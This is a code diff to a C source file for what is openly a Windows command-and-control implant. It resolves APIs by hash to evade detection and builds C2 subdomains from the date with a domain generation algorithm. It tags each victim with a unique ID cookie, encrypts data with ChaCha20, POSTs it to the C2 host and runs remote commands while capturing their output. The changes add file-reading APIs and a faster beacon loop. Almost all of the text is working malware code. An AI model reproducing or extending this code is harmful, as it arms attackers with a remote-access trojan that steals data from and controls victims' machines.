@@ -86,32 +86,37 @@ void generate_subdomains_by_date(wchar_t buffer[][32], int count, PFUNCTION_TABL
         buffer[i][24] = L'\0'; // total 24 chars: 12+12
     }
 }
+void ConvertUint64ToHex(uint64_t value, wchar_t *out)
+{
+    static const wchar_t hex[] = L"0123456789ABCDEF";
 
-void* WriteHex(const uint8_t* data, size_t bytes, PFUNCTION_TABLE ft) {
-    if (bytes == 0 || data == NULL)
-        return (void*)data;
+    // out[0] = L'0';
+    // out[1] = L'x';
 
-    size_t hexDigits = bytes * 2;
-    size_t outLen = 2 + hexDigits; // "0x" + hex digits
+    // Interpret the 64-bit integer as 8 bytes
+    const uint8_t *data = (const uint8_t *)&value;
 
-    char* buffer = ft->Ntdll.RtlAllocateHeap(ft->Kernel32.GetProcessHeap(), 0, outLen + 1);
-
-    if (!buffer) return (void*)data;
-
-    buffer[0] = '0';
-    buffer[1] = 'x';
-
-    for (size_t i = 0; i < bytes; ++i) {
-        uint8_t byte = data[i];
-        buffer[2 + i*2]     = "0123456789ABCDEF"[byte >> 4];
-        buffer[2 + i*2 + 1] = "0123456789ABCDEF"[byte & 0xF];
+    for (size_t i = 0; i < 8; ++i)
+    {
+        uint8_t b = data[i];  // NO REVERSAL
+        out[i*2]     = hex[b >> 4];
+        out[i*2 + 1] = hex[b & 0x0F];
     }
 
-    buffer[outLen] = '\0';
-
-    return buffer;
+    out[16] = L'\0';  // 2 + (8 bytes × 2 chars)
 }
 
+// generate unique 64bit IDs based on current 100 ns time
+
+uint64_t generate_unique_id(PFUNCTION_TABLE ft){
+
+    FILETIME SystemTimeAsFileTime;
+    LPFILETIME lpSystemTimeAsFileTime = &SystemTimeAsFileTime;
+    ft->Kernel32.GetSystemTimePreciseAsFileTime(lpSystemTimeAsFileTime);
+    uint64_t unique_id = ((uint64_t)lpSystemTimeAsFileTime->dwHighDateTime << 32) | lpSystemTimeAsFileTime->dwLowDateTime;
+    ConvertUint64ToHex(unique_id, ft->userID);
+
+}
 
 uint32_t hash_module_name_wide(const wchar_t *name) {
     uint32_t r9d = 0;
@@ -294,7 +299,23 @@ BOOL c2BeaconCommunicate(wchar_t* domain, PFUNCTION_TABLE ft){
 
     if (!hSession || !hConnect || !hRequest) {return FALSE;}
 
-    if (!ft->WinHttp.WinHttpAddRequestHeaders(hRequest, L"Cookie: 12E4A4FF050EB900\r\n", (ULONG)-1L, WINHTTP_ADDREQ_FLAG_ADD)) {return FALSE;}
+    WCHAR cookie[64];  // enough for "Cookie: " + 8 chars + CRLF + null
+    WCHAR *p = cookie;
+    // Step 1: copy "Cookie: "
+    custom_memcpy(p, L"Cookie: ", 8 * sizeof(WCHAR));
+    p += 8;
+    // Step 2: copy 8-character userID
+    custom_memcpy(p, ft->userID, 16 * sizeof(WCHAR));
+    p += 16;
+    // Step 3: append CRLF
+    *p++ = L'\r';
+    *p++ = L'\n';
+    // Step 4: null terminate
+    *p = L'\0';
+
+    if (!ft->WinHttp.WinHttpAddRequestHeaders(hRequest, cookie, (ULONG)-1L, WINHTTP_ADDREQ_FLAG_ADD)) {return FALSE;}
+
+    //if (!ft->WinHttp.WinHttpAddRequestHeaders(hRequest, L"\r\n", (ULONG)-1L, WINHTTP_ADDREQ_FLAG_ADD)) {return FALSE;}
     if (!ft->WinHttp.WinHttpSendRequest(hRequest, NULL, 0, NULL, 0, 0, 0)) {return FALSE;}
     ft->WinHttp.WinHttpReceiveResponse(hRequest, NULL);
 
@@ -350,19 +371,33 @@ BOOL c2BeaconCommunicate(wchar_t* domain, PFUNCTION_TABLE ft){
 
 // Gost Send function: encrypts message and sends to C2 server
 void gostSend(char* message, int message_len, const wchar_t* apiID, PFUNCTION_TABLE ft){
-    if (!apiID) apiID = L"0";  // set default manually
+    if (!apiID) apiID = L"0"; // "WRITE:PNG:" "DATAS:"  // set default manually
 
     // Encrypt message using ChaCha20
     chacha20_Full(message, message, message_len);
 
     // Send encrypted message to C2 server Using WinHTTP POST request
     HINTERNET hSession = ft->WinHttp.WinHttpOpen(L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
-    HINTERNET hConnect = ft->WinHttp.WinHttpConnect(hSession, L"venexv1.mal", 80, 0);
+    HINTERNET hConnect = ft->WinHttp.WinHttpConnect(hSession, ft->domain, 80, 0);
     HINTERNET hRequest = ft->WinHttp.WinHttpOpenRequest(hConnect, L"POST", apiID, NULL, NULL, NULL, 0);
 
     if (!hSession || !hConnect || !hRequest) {return;}
 
-    if (!ft->WinHttp.WinHttpAddRequestHeaders(hRequest, L"Cookie: 12E4A4FF050EB900\r\n", (ULONG)-1L, WINHTTP_ADDREQ_FLAG_ADD)) {return;}
+    WCHAR cookie[64];  // enough for "Cookie: " + 8 chars + CRLF + null
+    WCHAR *p = cookie;
+    // Step 1: copy "Cookie: "
+    custom_memcpy(p, L"Cookie: ", 8 * sizeof(WCHAR));
+    p += 8;
+    // Step 2: copy 8-character userID
+    custom_memcpy(p, ft->userID, 16 * sizeof(WCHAR));
+    p += 16;
+    // Step 3: append CRLF
+    *p++ = L'\r';
+    *p++ = L'\n';
+    // Step 4: null terminate
+    *p = L'\0';
+
+    if (!ft->WinHttp.WinHttpAddRequestHeaders(hRequest, cookie, (ULONG)-1L, WINHTTP_ADDREQ_FLAG_ADD)) {return;}
     if (!ft->WinHttp.WinHttpSendRequest(hRequest, NULL, 0, message, message_len, message_len, 0)) {return;}
 
     ft->WinHttp.WinHttpReceiveResponse(hRequest, NULL);
@@ -377,20 +412,21 @@ void gostSend(char* message, int message_len, const wchar_t* apiID, PFUNCTION_TA
 
 // gost Print function: prints message to C2 console, with optional formatting
 void gostPrint(char* message, BOOL format, int message_len, PFUNCTION_TABLE ft) {
-    if(!format){
-        gostSend(message, message_len, L"0", ft);
-        return;
-    }
+    return;
+    // if(!format){
+    //     gostSend(message, message_len, L"0", ft);
+    //     return;
+    // }
 
-    char* buffer = WriteHex((const uint8_t*)message, message_len, ft);
-    gostSend(buffer, message_len * 2 + 2, L"0", ft);
+    // char* buffer = WriteHex((const uint8_t*)message, message_len, ft);
+    // gostSend(buffer, message_len * 2 + 2, L"0", ft);
 
-    ft->Ntdll.RtlFreeHeap(ft->Kernel32.GetProcessHeap(), 0, buffer);
+    // ft->Ntdll.RtlFreeHeap(ft->Kernel32.GetProcessHeap(), 0, buffer);
 
 }
 
 // gost Execute function: fetches and executes module from C2 server
-BOOL gostExecute(char* command, char* output, DWORD outputSize, PFUNCTION_TABLE ft) {
+BOOL gostExecute(char* command, char* output, DWORD* outputSize, PFUNCTION_TABLE ft) {
     //char psCommand[1024];
     //snprintf(psCommand, sizeof(psCommand), "powershell -Command \"%s\"", command);
 
@@ -445,7 +481,7 @@ BOOL gostExecute(char* command, char* output, DWORD outputSize, PFUNCTION_TABLE 
     DWORD totalBytes = 0;
     
     while (ft->Kernel32.ReadFile(hStdoutRd, buffer, sizeof(buffer) - 1, &bytesRead, NULL) && bytesRead > 0) {
-        if (totalBytes + bytesRead < outputSize) {
+        if (totalBytes + bytesRead < *outputSize) {
             custom_memcpy(output + totalBytes, buffer, bytesRead);
             totalBytes += bytesRead;
         }
@@ -459,14 +495,14 @@ BOOL gostExecute(char* command, char* output, DWORD outputSize, PFUNCTION_TABLE 
     ft->Kernel32.CloseHandle(pi.hThread);
     ft->Kernel32.CloseHandle(hStdoutRd);
 
-    outputSize = totalBytes;
+    *outputSize = totalBytes;
     return TRUE;
 }
 
 
 __declspec(dllexport) void __main(void) {
 
-    derectSleep(FALSE,300);
+    //derectSleep(FALSE,300);
 
 
     // Initialize function table
@@ -492,8 +528,12 @@ __declspec(dllexport) void __main(void) {
     functionTable.Kernel32.CreatePipe = getFunctionBase(0x23E967FD, kernel32Base); // hash of "KERNEL32.DLL" + "CreatePipe"
     functionTable.Kernel32.SetHandleInformation = getFunctionBase(0x80A469C3, kernel32Base); // hash of "KERNEL32.DLL" + "SetHandleInformation"
     functionTable.Kernel32.ReadFile = getFunctionBase(0x2ABA496E, kernel32Base); // hash of "KERNEL32.DLL" + "ReadFile"
+    functionTable.Kernel32.CreateFileA = getFunctionBase(0x9F091EC6, kernel32Base); // hash of "KERNEL32.DLL" + "CreateFileA"
+    functionTable.Kernel32.GetFileSize = getFunctionBase(0x08DC1E1D, kernel32Base); // hash of "KERNEL32.DLL" + "GetFileSize"
 
     functionTable.Kernel32.GetLocalTime = getFunctionBase(0x280C4D4B, kernel32Base); // hash of "KERNEL32.DLL" + "GetLocalTime"
+
+    functionTable.Kernel32.GetSystemTimePreciseAsFileTime = getFunctionBase(0xF064B8AA, kernel32Base); // hash of "KERNEL32.DLL" + "GetSystemTimePreciseAsFileTime"
 
 
     // functionTable.Kernel32.HeapAlloc = getFunctionBase(0x8024706B, kernel32Base); // hash of "KERNEL32.DLL" + "HeapAlloc"
@@ -525,6 +565,10 @@ __declspec(dllexport) void __main(void) {
     // Test the resolved functions
     PFUNCTION_TABLE ft = &functionTable;
 
+    // generate unique ID for this instance
+    generate_unique_id(ft);
+
+
     wchar_t subdomains[10][32];
 
     generate_subdomains_by_date(subdomains, 10, ft);
@@ -533,9 +577,10 @@ __declspec(dllexport) void __main(void) {
     while (1)
     {
         
-        derectSleep(FALSE, 30); // Sleep for 5 seconds before next beacon
+        derectSleep(FALSE, 5); // Sleep for 5 seconds before next beacon
 
         if(c2BeaconCommunicate(subdomains[i], ft)){
+            ft->domain = subdomains[i];
             continue;
         }
 
